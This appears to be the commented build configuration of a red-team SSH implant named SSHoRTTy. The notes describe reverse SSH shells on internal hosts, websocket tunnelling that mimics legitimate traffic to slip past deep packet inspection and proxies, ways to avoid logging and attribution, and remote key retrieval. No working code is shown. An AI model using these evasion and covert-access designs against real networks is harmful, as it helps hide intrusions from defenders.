#       SSHoRTTy: Linux (future Mac) SSH real time shell implant
#           - Build custom versions for every environment
#           - Achieve full shell on internal host over reverse SSH tunnels.
#             readline, history, terminal UI, scp, sftp, exec over the same chanel
#           - SOCKS support out of the box
#             Future:  X forward, direct local and remote port tunnels.
#           - Armorized egress from corporate environment over websockets
#           - Proxy awareness (explicit and from environment) and ability to have credentials support
#           - Future: HTTP/2 tunnels
#
#           Future: Ability to specify and control commands run in restricted shells by junior RTOs.

####################### BUILD CONFIGURATION #########################################################
#           === Regular SSH Tunnel ===
#
# Goals:
#       - Do not use local SSH clients, drop your own. Avoids logging
#       - Cannot task employees to run convoluted SSH commands for us. One binary launch.
#       - Default SOCKS ports for convenience of the Red team operator.
#       - Achieves distributed nature of the connectivity and helps avoid attribution

#           === Websocket Armorized SSH Tunnel ===
#
# Goals:
#       - Hide from egress deep packet inspection catching SSH traffic
#       - Allow mimicry of a legitimate websocket traffic
#       - Work with a potential outbound proxy, support authentication
#       - Egress on port 443

##  SSH SSHServer (host)
# Proper publicly visible SSH host to connect/redirect to
# Please note: without armorized tunnels this is the only option to reach SSH server
# When using armorized tunnels like websockify over WSS:// you may have more exit options
# For example, if the WSS:// exit host is multihomed you could connect to the second network's SSH server
# SSHServerHost=10.16.0.5
# Or, you can even listen SSH on the localhost only if directly terminating agents on the WSS:// exit host
# This affords no exposure of SSH port to the wild at all.

# Option B: if the key needs to be pulled remotely
# The agent pulls the protected key and decrypts a key with a password.
# This is not SSH PK encryption, but a SSHORTY's "on the wire" protection scheme.
# Why not a direct pass-phrase encrypted SSH PK? Because there are a ton of SSH key file formats.
